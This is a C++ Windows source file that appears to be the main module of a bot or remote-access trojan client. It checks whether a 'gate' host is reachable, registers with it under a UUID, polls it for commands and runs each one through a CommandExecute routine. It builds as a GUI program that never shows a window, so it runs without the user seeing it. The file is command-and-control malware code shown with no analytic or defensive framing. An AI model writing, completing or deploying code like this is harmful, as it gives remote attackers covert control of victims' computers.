#ifndef UNICODE
#define UNICODE
#endif 
#include "Conf.h"
#include "SocketInit.h"
#include "StringOperations.h"
#include "WebConnect.h"
#include "HttpQuery.h"
#include "Connecter.h"
#include "Command.h"

#include <windows.h>
#include <winbase.h>
#include <string>
#include <stdio.h>

//#pragma comment(linker, "/subsystem:console /entry:WinMainCRTStartup")

using namespace std;

int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow);

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

void RunUp()
{
    char* iniCommand;
    char* szuuid;
    char* pollCommand;
    char* retCommand;
    bool continuePolling = true;
    int commandType = 0;
    char* commandData;
    wchar_t str[300];
    int counter = 0;

    GetInitialCommand(&iniCommand, &szuuid);
    swprintf(str, 300, L"ini: %hs\n", iniCommand);
    OutputDebugString(str);

    retCommand = SendCommand(iniCommand);
    free(iniCommand);

    swprintf(str, 300, L"ret: %hs\n", retCommand);
    OutputDebugString(str);
    
    ParseCommand(retCommand, &commandType, &commandData, &continuePolling);
    free(retCommand);
    while (continuePolling && counter < 3)
    {
        GetPollCommand(&pollCommand, szuuid);
        retCommand = SendCommand(pollCommand);
        swprintf(str, 300, L"poll: %hs\n", retCommand);
        OutputDebugString(str);
        ParseCommand(retCommand, &commandType, &commandData, &continuePolling);

        CommandExecute(commandType, commandData);
        free(retCommand);
        free(commandData);
        free(pollCommand);

        counter++;
        Sleep(POLL_RATE);
    }


    free(szuuid);
}



int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
{

    if (!SocketStartup()) return 0;
    





    bool ret = CheckIfWebsiteIsUp((char*)FALLBACK_GATE_HOST, (char*)FALLBACK_GATE_PATH);
    wchar_t str[100];
    
    if (ret) {
        RunUp();
        
        swprintf(str, 100, L"End\n");
        OutputDebugString(str);
    }

    return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);



        FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));

        EndPaint(hwnd, &ps);
    }
    return 0;

    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}